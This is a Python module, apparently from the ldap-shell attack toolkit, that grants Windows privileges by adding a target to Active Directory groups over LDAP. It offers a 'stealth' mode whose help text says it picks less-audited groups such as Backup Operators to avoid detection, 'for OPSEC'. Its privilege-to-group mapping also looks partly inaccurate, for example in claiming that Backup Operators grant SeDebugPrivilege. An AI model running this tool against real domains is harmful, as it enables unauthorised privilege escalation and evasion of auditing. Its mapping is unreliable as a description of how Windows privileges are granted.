import logging
from ldap3 import Connection, MODIFY_ADD, MODIFY_DELETE
from ldapdomaindump import domainDumper
from pydantic import BaseModel, Field
from typing import Optional
from ldap_shell.ldap_modules.base_module import BaseLdapModule, ArgumentType
from ldap_shell.utils.ldap_utils import LdapUtils
from ldap3.utils.conv import escape_filter_chars
import ldap3

class LdapShellModule(BaseLdapModule):
    """Module for assigning Windows privileges to users/groups by adding them to appropriate AD groups"""
    
    help_text = "Assign Windows privileges to users/groups by adding them to appropriate AD groups. Use stealth mode to avoid highly audited groups like Domain Admins."
    examples_text = """
    Assign SeDebugPrivilege to user john (stealth mode - uses Backup Operators instead of Domain Admins):
    `set_privilege john SeDebugPrivilege add stealth`
    ```
    [INFO] Stealth mode: selecting less visible group...
    [INFO] Selected stealth group: Backup Operators (less audited)
    [INFO] Adding john to Backup Operators group to grant SeDebugPrivilege (less visible)
    [INFO] Successfully added "john" to "Backup Operators"
    [INFO] Privilege SeDebugPrivilege granted via Backup Operators group
    ```
    ```
    [INFO] Stealth mode: selecting less visible group...
    [INFO] Selected stealth group: Backup Operators (less audited)
    [INFO] Adding john to Backup Operators group to grant SeDebugPrivilege (less visible)
    [INFO] Successfully added "john" to "Backup Operators"
    [INFO] Privilege SeDebugPrivilege granted via Backup Operators group
    ```
    
    Assign SeDebugPrivilege normally (uses Domain Admins - highly visible):
    `set_privilege john SeDebugPrivilege add`
    ```
    [INFO] Adding john to Domain Admins group to grant SeDebugPrivilege (highly visible)
    [INFO] Successfully added "john" to "Domain Admins"
    [INFO] Privilege SeDebugPrivilege granted via Domain Admins group
    ```
    
    Remove SeBackupPrivilege from user john:
    `set_privilege john SeBackupPrivilege del`
    ```
    [INFO] Removing john from Backup Operators group to revoke SeBackupPrivilege
    [INFO] Successfully removed "john" from "Backup Operators"
    [INFO] Privilege SeBackupPrivilege revoked
    ```
    
    Note: Stealth mode prefers less audited groups (Backup Operators, Server Operators, etc.)
    over highly visible groups (Domain Admins, Enterprise Admins). Use for OPSEC.
    """
    module_type = "Abuse ACL"

    # Mapping privileges to groups that grant them
    # Format: [less_visible_group, more_visible_group, ...]
    # Groups are ordered from least to most visible/audited
    PRIVILEGE_TO_GROUPS = {
        'SeDebugPrivilege': ['Backup Operators', 'Account Operators', 'Server Operators', 'Administrators', 'Domain Admins', 'Enterprise Admins'],
        'SeBackupPrivilege': ['Backup Operators', 'Server Operators', 'Account Operators', 'Administrators', 'Domain Admins', 'Enterprise Admins'],
        'SeRestorePrivilege': ['Backup Operators', 'Server Operators', 'Account Operators', 'Administrators', 'Domain Admins', 'Enterprise Admins'],
        'SeTakeOwnershipPrivilege': ['Backup Operators', 'Server Operators', 'Account Operators', 'Administrators', 'Domain Admins', 'Enterprise Admins'],
        'SeLoadDriverPrivilege': ['Server Operators', 'Backup Operators', 'Administrators'],
        'SeSystemtimePrivilege': ['Server Operators', 'Administrators', 'Local Service'],
        'SeProfileSingleProcessPrivilege': ['Server Operators', 'Administrators'],
        'SeIncreaseBasePriorityPrivilege': ['Server Operators', 'Administrators'],
        'SeCreatePagefilePrivilege': ['Server Operators', 'Administrators'],
        'SeIncreaseQuotaPrivilege': ['Server Operators', 'Administrators'],
        'SeSecurityPrivilege': ['Backup Operators', 'Server Operators', 'Account Operators', 'Administrators', 'Domain Admins', 'Enterprise Admins'],
        'SeSystemEnvironmentPrivilege': ['Server Operators', 'Administrators'],
        'SeChangeNotifyPrivilege': ['Everyone', 'Authenticated Users', 'Users'],
        'SeRemoteShutdownPrivilege': ['Server Operators', 'Administrators'],
        'SeUndockPrivilege': ['Users', 'Administrators'],
        'SeSyncAgentPrivilege': ['Account Operators', 'Server Operators', 'Domain Admins', 'Enterprise Admins'],
        'SeEnableDelegationPrivilege': ['Account Operators', 'Server Operators', 'Domain Admins', 'Enterprise Admins'],
        'SeManageVolumePrivilege': ['Server Operators', 'Administrators'],
        'SeImpersonatePrivilege': ['Service', 'Server Operators', 'Administrators', 'Local Service', 'Network Service'],
        'SeCreateGlobalPrivilege': ['Service', 'Server Operators', 'Administrators', 'Local Service', 'Network Service'],
        'SeCreateSymbolicLinkPrivilege': ['Server Operators', 'Administrators'],
        'SeTimeZonePrivilege': ['Users'],
    }
    
    # Groups that are less visible/audited (preferred for stealth)
    STEALTH_GROUPS = [
        'Backup Operators',
        'Server Operators', 
        'Account Operators',
        'Print Operators',
        'Remote Desktop Users',
        'Remote Management Users',
        'Network Configuration Operators',
        'Performance Log Users',
        'Performance Monitor Users',
        'Distributed COM Users',
        'Event Log Readers',
        'Cryptographic Operators',
        'DnsAdmins',
        'Schema Admins',  # Still visible but less than Domain Admins
    ]

    class ModuleArgs(BaseModel):
        target: str = Field(
            description="User or group to assign privilege to",
            arg_type=[ArgumentType.USER, ArgumentType.GROUP, ArgumentType.COMPUTER]
        )
        privilege: str = Field(
            description="Windows privilege to assign (e.g., SeDebugPrivilege)",
            arg_type=ArgumentType.STRING
        )
        action: str = Field(
            description="Action: add (grant privilege) or del (revoke privilege)",
            arg_type=ArgumentType.ADD_DEL
        )
        stealth: Optional[str] = Field(
            None,
            description="Optional: use 'stealth' to select less visible groups (Backup Operators, Server Operators, etc.) instead of Domain Admins",
            arg_type=ArgumentType.STRING
        )

    def __init__(self, args_dict: dict, 
                 domain_dumper: domainDumper, 
                 client: Connection,
                 log=None):
        self.args = self.ModuleArgs(**args_dict) 
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def find_privilege_groups(self, privilege: str) -> list:
        """Find AD groups that grant the specified privilege"""
        if privilege not in self.PRIVILEGE_TO_GROUPS:
            return []
        
        groups = []
        for group_name in self.PRIVILEGE_TO_GROUPS[privilege]:
            # Skip built-in groups that don't exist in AD
            if group_name in ['Everyone', 'Authenticated Users', 'Users', 'Local Service', 'Network Service', 'Service']:
                continue
            
            group_dn = LdapUtils.get_dn(self.client, self.domain_dumper, group_name)
            if group_dn:
                groups.append({
                    'name': group_name,
                    'dn': group_dn
                })
        
        return groups

    def check_group_membership(self, user_dn: str, group_dn: str) -> bool:
        """Check if user is member of group"""
        self.client.search(
            group_dn,
            '(objectClass=*)',
            attributes=['member']
        )
        
        if self.client.entries and 'member' in self.client.entries[0]:
            members = self.client.entries[0]['member'].values
            return user_dn in members
        return False

    def add_to_group(self, user_dn: str, group_dn: str, group_name: str) -> bool:
        """Add user to group"""
        try:
            res = self.client.modify(
                group_dn,
                {'member': [(MODIFY_ADD, [user_dn])]}
            )
            if res:
                self.log.info('Successfully added "%s" to "%s"', self.args.target, group_name)
                return True
            else:
                self.log.error('Failed to add user: %s', self.client.result['description'])
                return False
        except Exception as e:
            self.log.error(f'Failed to add user to group: {str(e)}')
            return False

    def remove_from_group(self, user_dn: str, group_dn: str, group_name: str) -> bool:
        """Remove user from group"""
        try:
            res = self.client.modify(
                group_dn,
                {'member': [(MODIFY_DELETE, [user_dn])]}
            )
            if res:
                self.log.info('Successfully removed "%s" from "%s"', self.args.target, group_name)
                return True
            else:
                self.log.error('Failed to remove user: %s', self.client.result['description'])
                return False
        except Exception as e:
            self.log.error(f'Failed to remove user from group: {str(e)}')
            return False

    def __call__(self):
        # Validate privilege
        if self.args.privilege not in self.PRIVILEGE_TO_GROUPS:
            self.log.error(f'Unknown privilege: {self.args.privilege}')
            self.log.info(f'Known privileges: {", ".join(sorted(self.PRIVILEGE_TO_GROUPS.keys()))}')
            return

        # Validate action
        if self.args.action.lower() not in ['add', 'del']:
            self.log.error('Action must be "add" or "del"')
            return

        # Get target DN
        target_dn = LdapUtils.get_dn(self.client, self.domain_dumper, self.args.target)
        if not target_dn:
            self.log.error(f'Target not found: {self.args.target}')
            return

        # Find groups that grant this privilege
        privilege_groups = self.find_privilege_groups(self.args.privilege)
        
        if not privilege_groups:
            self.log.error(f'No AD groups found that grant {self.args.privilege}')
            self.log.info('This privilege may be granted through local groups or GPO, not AD groups')
            return

        # For add: add to first available group
        # For del: remove from all groups that grant this privilege
        if self.args.action.lower() == 'add':
            # Check if already member of any privilege group
            for group in privilege_groups:
                if self.check_group_membership(target_dn, group['dn']):
                    self.log.info(f'{self.args.target} already has {self.args.privilege} via {group["name"]} group')
                    return
            
            # Select target group based on stealth mode
            target_group = None
            stealth_mode = self.args.stealth and self.args.stealth.lower() == 'stealth'
            
            if stealth_mode:
                # Stealth mode: prefer less visible groups
                self.log.info('Stealth mode: selecting less visible group...')
                for group in privilege_groups:
                    if group['name'] in self.STEALTH_GROUPS:
                        target_group = group
                        self.log.info(f'Selected stealth group: {group["name"]} (less audited)')
                        break
                
                # If no stealth group found, use first available (least visible from list)
                if not target_group and privilege_groups:
                    target_group = privilege_groups[0]
                    self.log.warning(f'No stealth groups available, using: {target_group["name"]}')
            else:
                # Normal mode: prefer Domain Admins/Administrators (more visible but standard)
                for group in privilege_groups:
                    if 'Domain Admins' in group['name'] or 'Administrators' in group['name']:
                        target_group = group
                        break
                
                if not target_group:
                    target_group = privilege_groups[0]
            
            if not target_group:
                self.log.error('No suitable group found')
                return
            
            visibility = "less visible" if target_group['name'] in self.STEALTH_GROUPS else "highly visible"
            self.log.info(f'Adding {self.args.target} to {target_group["name"]} group to grant {self.args.privilege} ({visibility})')
            if self.add_to_group(target_dn, target_group['dn'], target_group['name']):
                self.log.info(f'Privilege {self.args.privilege} granted via {target_group["name"]} group')
                # Check if modifying own group membership
                try:
                    current_user = self.client.extend.standard.who_am_i()
                    if current_user and target_dn.lower() == current_user.lower():
                        self.log.warning('You modified your own group membership. Re-login may be required for changes to take effect.')
                except:
                    pass

        else:  # del
            removed = False
            for group in privilege_groups:
                if self.check_group_membership(target_dn, group['dn']):
                    self.log.info(f'Removing {self.args.target} from {group["name"]} group to revoke {self.args.privilege}')
                    if self.remove_from_group(target_dn, group['dn'], group['name']):
                        removed = True
            
            if removed:
                self.log.info(f'Privilege {self.args.privilege} revoked')
            else:
                self.log.info(f'{self.args.target} is not a member of any group that grants {self.args.privilege}')

